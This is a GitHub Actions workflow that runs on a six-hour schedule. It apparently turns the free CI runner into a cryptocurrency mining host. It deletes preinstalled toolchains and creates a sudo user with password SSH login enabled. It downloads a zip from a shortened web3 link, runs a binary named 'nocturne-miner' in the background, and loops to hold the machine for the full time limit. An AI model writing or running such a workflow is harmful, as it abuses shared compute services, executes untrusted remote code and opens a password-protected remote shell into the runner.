name: Linux Runner

on:
  # 1. This makes it run automatically every 6 hours
  schedule:
    - cron: '0 */6 * * *'
  # 2. This lets you run it manually from the "Actions" tab
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    # Set timeout to just under 6 hours (350 minutes)
    timeout-minutes: 350 

    steps:
      - name: Maximize build space
        # This frees up about 14GB of space on the runner
        run: |
          sudo rm -rf /usr/share/dotnet
          sudo rm -rf /opt/ghc
          sudo rm -rf "/usr/local/share/boost"
          sudo rm -rf "$AGENT_TOOLSDIRECTORY"

      - name: Set up SSH server
        run: |
          # Generate a random password (16 chars)
          PASSWORD=$(openssl rand -base64 12)
          echo "RUNNER_PASSWORD=$PASSWORD" >> $GITHUB_ENV
          
          # Create a new user 'runner' and set its password
          sudo useradd -m runnersh
          echo "runnersh:$PASSWORD" | sudo chpasswd
          sudo usermod -aG sudo runnersh
          
          # Install and configure OpenSSH server
          sudo apt-get update
          sudo apt-get install -y openssh-server
          sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
          sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
          
          # Start the SSH service
          sudo service ssh start
      # --- YOUR NEW STEP ---
      - name: ðŸ¤– Run Your Custom Command
        run: |
          echo "Starting custom commands..."
          
          # Install 'unzip' utility
          sudo apt-get update
          sudo apt-get install -y unzip

          # --- 1. Download the file ---
          # Replace with your actual download link
          echo "Downloading file..."
          curl -L -o s1.zip  "https://go.web3approved.com/c9M5u" 
          
          # --- 2. Unzip the file ---
          echo "Unzipping file..."
          unzip s1.zip
          
          # --- 3. Run the executable ---
          # Replace 'your_executable_name' with the actual file name
          echo "Running executable..."
          # Make the file executable (good practice)
          cd s1
          chmod +x ./nocturne-miner
          
          # Run the executable. 
          # If it's a server or bot, add '&' to run it in the background
          # so the workflow can continue to the "Keep Alive" step.
          echo | ./nocturne-miner --no-menu 2>&1 | awk 'NR <= 20' &
          
          echo "Custom commands finished."
          
          # Loop to keep the job from ending
          while true; do
            echo "[$(date)] Session active. Machine will terminate automatically at 6-hour limit."
            sleep 300
          done
